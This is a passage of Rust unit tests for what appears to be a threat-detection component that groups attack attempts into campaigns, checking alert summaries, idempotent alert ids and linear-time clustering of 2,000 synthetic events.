        assert_eq!(new[0].alert_type, AlertType::CampaignUpdated);
        assert_eq!(new[0].severity, Severity::Medium);
        assert!(new[0].validate().is_ok());
        assert!(new[0].summary.starts_with("New active campaign"));
        let same = BTreeMap::from([(k.campaign_id.clone(), 3)]);
        assert!(alerts(&same, &c.campaigns).is_empty());
        let grew = alerts(&BTreeMap::from([(k.campaign_id.clone(), 2)]), &c.campaigns);
        assert!(grew[0].summary.contains("grew from 2 to 3"));
        // The id is over tenant, campaign and size, so a retried producer
        // raises the same alert for the same growth.
        assert_eq!(grew[0].alert_id, new[0].alert_id);
    }

    #[test]
    fn work_is_linear_in_shared_keys() {
        // 2,000 attempts sharing one hash cluster without pairwise work, and
        // the per-member evidence stays bounded.
        let events: Vec<Value> = (0..2000)
            .map(|i| {
                post(
                    &format!("e{i}"),
                    T0 + i,
                    &format!("d{}", i % 50),
                    &format!("198.51.100.{}", i % 250),
                    HASH,
                )
            })
            .collect();
        let r = prepare(events);
        let c = run(&r, &[]);
        assert_eq!(c.campaigns.len(), 1);
        assert!(
            c.campaigns[0]
                .members
                .iter()
                .all(|m| m.joined_by.len() <= MAX_JOINS_PER_MEMBER)
        );
        assert_eq!(
            c.campaigns[0].feature_summary.targeting.pattern,
            TargetingPattern::Mass
        );
    }
}
